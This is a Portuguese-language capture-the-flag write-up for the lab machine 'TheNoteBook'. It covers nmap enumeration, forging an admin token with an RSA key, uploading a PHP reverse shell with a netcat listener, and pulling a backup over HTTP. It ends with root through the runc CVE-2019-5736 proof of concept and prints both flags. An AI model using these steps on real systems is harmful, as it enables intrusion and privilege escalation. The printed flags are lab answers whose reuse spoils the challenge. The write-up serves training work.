# TheNoteBook

---

## Enum

---

- Descobrimento das portas abertas utilizando nmap:

```python
nmap -A 10.10.10.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 17:21 -03
Nmap scan report for 10.10.10.230
Host is up (0.14s latency).
Not shown: 896 closed ports, 102 filtered ports
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

---

## Exploration

---

- Ao ver a resposta do nmap de volta , teve o conhecimento da porta 80 aberta , por default tinha uma aplicação web rodando, então ao registrar a conta, o servidor deu um token junto com a conta criada , então apenas com uma modificação do token, a conta teria um privilégio de administrador.

![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/Untitled.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/Untitled.png)

- Então criamos uma chave RSA com openssl para válidar nosso token.

```python
openssl genrsa -out privKey.key 2048
```

- Então com o reconhecimento da página , teve o conhecimento para fazer upload de arquivos,então subimos uma Reverse shell em php e a executamos:

![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/Untitled%201.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/Untitled%201.png)

- Ao pegar shell , percebemos um arquivo de backup chamado "home.tar.gz", então puxamos para nossa maquina:

```python
nc -lvnp PORT
```

```python
python3 -m http.server
```

```python
wget [http://10.10.10.230:8000/home.tar.gz](http://10.10.10.230:8000/home.tar.gz) 
```

```python
tar -xzvf home.tar.gz
```

- Trocando de user e tinha a primeira flag!

User flag: dfed2065e59b2d453d341d27e123c25e

---

## Pós-Exploration

---

```python
sudo -l
User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

- Então ao pesquisar esse privilege escalation no google , teve o reconhecimento da CVE-2019-5736 → [https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)
- Editamos a cve:

    ![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/bash.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/bash.png)

- E fizemos a compilação:

    ![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/compilar.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/compilar.png)

- Entramos na docker :

![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/docker.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/docker.png)

- Abrimos um servidor e subimos nosso binario "main":

![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/main.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/main.png)

- Ao executar o binario na docker, deixaremos uma porta ouvindo com o netcat e com o segundo terminal executamos a docker!

![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/sh.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/sh.png)

- Root!

![TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/root.png](TheNoteBook%203bb74b2003f0467bbd9357d966ca7005/root.png)

Root Flag:584012a257e2e43dbf5d6cf66507af41